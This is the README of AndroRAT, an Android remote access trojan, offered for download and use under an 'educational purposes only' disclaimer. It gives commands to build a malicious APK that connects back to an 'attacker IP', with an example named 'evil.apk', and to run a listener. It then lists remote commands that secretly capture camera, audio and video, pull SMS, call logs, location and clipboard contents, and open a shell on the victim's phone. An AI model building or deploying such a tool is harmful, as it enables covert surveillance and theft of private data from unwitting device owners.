**Disclaimer** : This software is meant for educational purposes only. I don't feel responsible for any malicious use of the app.
# AndroRAT 
[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) <a href='https://github.com/karma9874' target='_blank'><img src "https://img.shields.io/github/followers/karma9874?label=Follow&style=social"></a>
<a href='https://twitter.com/karma9874' target='_blank'><img src "https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social"></a>

AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.

##### AndroRAT will work on device from Android 4.0 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)

> AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 

## Screenshots

![AndroRAT](https://github.com/karma9874/AndroRAT/blob/master/Screenshots/5.jpg "AndroRAT in action")

## Prerequisites
AndroRAT requires Python (> 3.6) and JAVA (or Android Studio)

## Installation
```
git clone https://github.com/karma9874/AndroRAT.git
```
## Usage
### Available Modes
* `--build` - for building the android apk 
* `--shell` - getting an interactive shell of the device
### `build` mode
```
Usage:
  python androRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
```
Or you can manually build the apk by importing [Android Code]() folder to Android Studio and changing the IP address and port number in [config.java]() file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  python androRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device
Commands which can run on the interpreter
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
## Examples

* To build the apk:
```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```

* To get the interpreter:
```python androRAT.py --shell -i 0.0.0.0 -p 8000```

## Interpreter Examples
* Generating APK
<p align="center">
  <img src="https://github.com/karma9874/AndroRAT/blob/master/Screenshots/6.JPG" width="600"/>
</p>
------------------------------------------------------------------------------------------------------------------------------
* Some interpreter Commands 
<p align="center">
  <img src="https://github.com/karma9874/AndroRAT/blob/master/Screenshots/1.JPG" width="600"/>
</p>
------------------------------------------------------------------------------------------------------------------------------

## License
AndroRAT is licensed under MIT license take a look at the [LICENSE](https://github.com/karma9874/AndroRAT/blob/master/LICENSE) for more information.


